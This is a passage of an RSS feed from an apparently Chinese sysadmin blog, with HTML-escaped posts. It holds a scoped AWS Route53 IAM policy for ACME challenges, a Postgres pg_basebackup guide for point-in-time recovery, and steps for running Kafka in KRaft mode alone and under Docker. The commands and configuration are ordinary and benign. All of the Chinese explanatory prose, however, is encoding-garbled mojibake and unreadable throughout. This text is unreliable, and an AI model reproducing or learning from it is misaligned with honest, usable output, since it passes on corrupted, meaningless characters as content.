&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;        },
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Effect&lt;span class=&#34;s2&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;Allow&lt;span class=&#34;s2&#34;&gt;&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Action&lt;span class=&#34;s2&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;route53:ListHostedZonesByName&lt;span class=&#34;s2&#34;&gt;&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;        },
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Effect&lt;span class=&#34;s2&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;Allow&lt;span class=&#34;s2&#34;&gt;&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Action&lt;span class=&#34;s2&#34;&gt;&amp;#34;: [
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                &amp;#34;&lt;/span&gt;route53:ListResourceRecordSets&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            ],
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Resource&lt;span class=&#34;s2&#34;&gt;&amp;#34;: [
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                &amp;#34;&lt;/span&gt;arn:aws:route53:::hostedzone/Z01111111111111111111&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            ]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;        },
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Effect&lt;span class=&#34;s2&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;Allow&lt;span class=&#34;s2&#34;&gt;&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Action&lt;span class=&#34;s2&#34;&gt;&amp;#34;: [
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                &amp;#34;&lt;/span&gt;route53:ChangeResourceRecordSets&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            ],
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Resource&lt;span class=&#34;s2&#34;&gt;&amp;#34;: [
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                &amp;#34;&lt;/span&gt;arn:aws:route53:::hostedzone/Z01111111111111111111&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            ],
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Condition&lt;span class=&#34;s2&#34;&gt;&amp;#34;: {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                &amp;#34;&lt;/span&gt;ForAllValues:StringEquals&lt;span class=&#34;s2&#34;&gt;&amp;#34;: {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                    &amp;#34;&lt;/span&gt;route53:ChangeResourceRecordSetsNormalizedRecordNames&lt;span class=&#34;s2&#34;&gt;&amp;#34;: [
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                        &amp;#34;&lt;/span&gt;_acme-challenge.example.com&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                    ],
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                    &amp;#34;&lt;/span&gt;route53:ChangeResourceRecordSetsRecordTypes&lt;span class=&#34;s2&#34;&gt;&amp;#34;: [
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                        &amp;#34;&lt;/span&gt;TXT&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                    ]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    ]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå»ºç«‹ä¸€ä¸ªRoleï¼ŒRealUpdateCertRoleï¼Œç»‘å®šä¸Šé¢çš„ç­–ç•¥&lt;/p&gt;</description>
    </item>
    <item>
      <title>Postgresçš„walå’ŒPITRæ—¶é—´ç‚¹æ¢å¤</title>
      <link>https://rendoumi.com/posts/20250728-postgres_wal_pitr/</link>
      <pubDate>Mon, 28 Jul 2025 11:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250728-postgres_wal_pitr/</guid>
      <description>&lt;p&gt;ç ”ç©¶äº†Postgresçš„åº“æ•°æ®æ¢å¤å’Œè½¬ç§»ï¼Œå†æ¥ç ”ç©¶ä¸€ä¸‹PITRæŒ‰æ—¶é—´ç‚¹æ¢å¤&lt;/p&gt;
&lt;p&gt;ç±»æ¯”åˆ°MySQLï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯è¿ç»´ï¼Œä¸æ˜¯ä¸“ä¸šçš„DBAï¼Œæ‰€ä»¥æ¢å¤åˆ°æ­£ç¡®æ•°æ®å³å¯&lt;/p&gt;
&lt;p&gt;é‚£è·Ÿé˜¿é‡Œäº‘ä»¥åŠè‡ªå»ºçš„MySQLæ¢å¤ä¸€æ ·ï¼Œé¦–å…ˆéƒ½è¦æœ‰ä¸€ä¸ªæ¯å¤©çš„åŸºç¡€å¤‡ä»½ï¼Œç„¶åç±»æ¯”MySQLçš„Binlogï¼ŒPostgresè¿™é‡Œå°±ç›¸å½“äºwalã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¹ˆç±»æ¯”å°±å¯¹äº†ï¼Œé‚£ä¹ˆæ¢å¤è¿‡ç¨‹çš„æ€è·¯æ˜¯ä¸€æ ·çš„ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é¦–å…ˆå»ºç«‹ä¸€ä¸ªæ–°çš„å®ä¾‹&lt;/li&gt;
&lt;li&gt;ç¬¬äºŒæ­¥æŠŠæ¯å¤©çš„åŸºç¡€ç‰©ç†å…¨å¤‡ç»™æ¢å¤ä¸Šå»&lt;/li&gt;
&lt;li&gt;ç¬¬ä¸‰æ­¥æŠŠä¹‹åçš„walæ—¥å¿—ä¼ åˆ°æ–°å®ä¾‹ï¼Œæ¢å¤åˆ°æŒ‡å®šæ—¶é—´ç‚¹&lt;/li&gt;
&lt;li&gt;ç¬¬å››æ­¥æœ€åæŠŠè¡¨æˆ–åº“Dumpä¸‹æ¥ï¼ŒçŒå…¥åˆ°æ—§å®ä¾‹çš„æ–°è¡¨æˆ–æ–°åº“&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é‚£æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥æ¥è§£é‡Šï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€æ¯å¤©å»ºç«‹ä¸€ä¸ªåŸºç¡€å¤‡ä»½è¿™æ ·åœ¨baseåŸºç¡€ä¸Šåªéœ€æ¢å¤å½“å¤©çš„walé€Ÿåº¦å¤Ÿå¿«&#34;&gt;ä¸€ã€æ¯å¤©å»ºç«‹ä¸€ä¸ªåŸºç¡€å¤‡ä»½ï¼Œè¿™æ ·åœ¨BaseåŸºç¡€ä¸Šï¼Œåªéœ€æ¢å¤å½“å¤©çš„walï¼Œé€Ÿåº¦å¤Ÿå¿«&lt;/h5&gt;
&lt;p&gt;å»ºç«‹æ¯å¤©çš„BaseåŸºç¡€ç‰©ç†å¤‡ä»½&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pg_basebackup -Ft -Pv -Xf -z -Z5 -U postgres -h localhost -p &lt;span class=&#34;m&#34;&gt;5432&lt;/span&gt; -D /pg_backup
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è§£é‡Šä¸€ä¸‹ï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -Ftï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        æŒ‡å®šå¤‡ä»½æ ¼å¼ä¸º tarã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        å¦‚æœä½¿ç”¨ tar æ ¼å¼ï¼Œå¤‡ä»½ä¼šè¾“å‡º tar æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸éœ€è¦ç›´æ¥è®¿é—® PostgreSQL æ•°æ®ç›®å½•ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -Pvï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        -Pï¼šæ˜¾ç¤ºå¤‡ä»½è¿›åº¦ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        -vï¼šå¯ç”¨è¯¦æƒ…æ¨¡å¼ï¼ˆverboseï¼‰ï¼Œæ˜¾ç¤ºæ›´å¤šæ—¥å¿—ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -Xfï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        -Xï¼šæ§åˆ¶ WAL æ—¥å¿—çš„å¤„ç†æ–¹å¼ï¼Œf è¡¨ç¤ºåœ¨å¤‡ä»½ä¸­åŒ…å« WAL æ–‡ä»¶ï¼ˆWrite Ahead Logsï¼‰ï¼Œç¡®ä¿å¤‡ä»½å¯ä»¥ç”¨äºæ¢å¤åˆ°å®Œæ•´çš„ä¸€è‡´çŠ¶æ€ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -zï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        å¯ç”¨å‹ç¼©åŠŸèƒ½ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -Z5ï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        è®¾ç½®å‹ç¼©çº§åˆ«ä¸º 5ï¼ˆå‹ç¼©çº§åˆ«ä» &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; åˆ° 9ï¼Œ9 ä¸ºæœ€é«˜å‹ç¼©ï¼‰ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -U postgresï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ä½¿ç”¨ postgres ç”¨æˆ·æ¥è¿æ¥æ•°æ®åº“ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -h localhostï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        æŒ‡å®šæ•°æ®åº“ä¸»æœºä¸ºå½“å‰æœºå™¨ï¼ˆlocalhostï¼‰ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -p 5432ï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        æŒ‡å®š PostgreSQL ç›‘å¬ç«¯å£ä¸º 5432ï¼ˆé»˜è®¤ç«¯å£ï¼‰ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -D /pg_backupï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        å°†å¤‡ä»½æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šè·¯å¾„ /pg_backup ä¸­ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·æˆ‘ä»¬å°±åœ¨ /pg_backup ä¸­æœ‰äº†å¤‡ä»½æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä¸€ä¸ªbackup_manifestçš„æ–‡ä»¶æ¸…å•ï¼Œä»¥åŠä¸€ä¸ªå‹ç¼©åŒ…&lt;/p&gt;</description>
    </item>
    <item>
      <title>å•æœºéƒ¨ç½²kafkaç”¨kraftä¸ä¾èµ–zookeeper</title>
      <link>https://rendoumi.com/posts/20250728-kafka_kraft_alone/</link>
      <pubDate>Mon, 28 Jul 2025 10:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250728-kafka_kraft_alone/</guid>
      <description>&lt;p&gt;ä¸Šä¸€ç¯‡è¯´äº†ç”¨Dockeréƒ¨ç½²kafkaï¼Œåç«¯ä¸ç”¨zookeeperï¼Œæ”¹ç”¨kraftã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸€ç¯‡è¯´è¯´ä¸ç”¨Dockerï¼Œç›´æ¥å•æœºéƒ¨ç½²kafkaç”¨kraftçš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ã€å‡†å¤‡ï¼Œè™šæœºçš„è¯éœ€è¦4cpu 8Gå†…å­˜&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è£…å¥½java&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java --version
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å»º3ä¸ªç›®å½•
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ”¾kafkaçš„2è¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /opt/kafka  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ”¾kafkaçš„æ—¥å¿—æ–‡ä»¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /var/log/kafka
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ”¾kafkaçš„æ•°æ®æ–‡ä»¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /var/lib/kafka
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;äºŒã€ä¸‹è½½å¹¶é…ç½®kafka&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# é‡Šæ”¾åˆ°æŒ‡å®šç›®å½•&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar -xzf kafka_2.13-3.5.0.tgz -C /opt/kafka
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ä¿®æ”¹/opt/kafka/config/server.properties&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;process.roles&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;broker,controller
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;node.id&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;controller.quorum.voters&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1@localhost:9093
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;listeners&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;PLAINTEXT://localhost:9092,CONTROLLER://localhost:9093
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;log.dirs&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/lib/kafka
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç„¶åéœ€è¦å†è¿½åŠ åˆ°server.propertiesçš„éƒ¨åˆ†&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metadata.log.dir&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/lib/kafka/metadata
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;num.replica.fetchers&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;offsets.topic.replication.factor&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;transaction.state.log.replication.factor&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;transaction.state.log.min.isr&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰ã€åˆå§‹åŒ–kafkaé›†ç¾¤&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç”Ÿæˆä¸€ä¸ªuuid&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;uuidgen
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dc66bcb0-758e-4360-843d-5ccb1da2ee74
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# åˆå§‹åŒ–&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /opt/kafka
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bin/kafka-storage.sh format -t &amp;lt;UUID&amp;gt; -c config/server.properties
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å¯åŠ¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bin/kafka-server-start.sh config/server.properties
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ£€æŸ¥ä¸€ä¸‹ä»£ç†çš„çŠ¶æ€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bin/kafka-broker-api-versions.sh --bootstrap-server localhost:9092
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å››ã€æ¨é€æ•°æ®éªŒè¯&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç”¨Dockeréƒ¨ç½²kafkaä¸”ä¸ä¾èµ–zookeeper</title>
      <link>https://rendoumi.com/posts/20250728-kafka_kraft_docker/</link>
      <pubDate>Mon, 28 Jul 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250728-kafka_kraft_docker/</guid>
      <description>&lt;p&gt;ç”¨&lt;code&gt;redpanda&lt;/code&gt;å±…ç„¶è¿˜è¦æ¯éš”30å¤©æ›´æ–°ä¸€ä¸‹Licenseæ–‡ä»¶ï¼Œå”å¯å¿å©¶ä¸å¯å¿å•Šã€‚&lt;/p&gt;
&lt;p&gt;æ¢æ‰æ¢æ‰ï¼Œç›´æ¥ç”¨Dockeréƒ¨ç½²kafkaï¼Œåç«¯ä¸ç”¨zookeeperï¼Œç”¨kraftï¼Œå¤©ä¸‹è‹¦zkä¹Ÿä¹…çŸ£ï¼&lt;/p&gt;
&lt;p&gt;æ–¹æ³•å¾ˆç®€å•ï¼Œç”¨docker-composeï¼Œç¼–è¾‘&lt;code&gt;docker-compose.yml&lt;/code&gt;æ–‡ä»¶&lt;/p&gt;
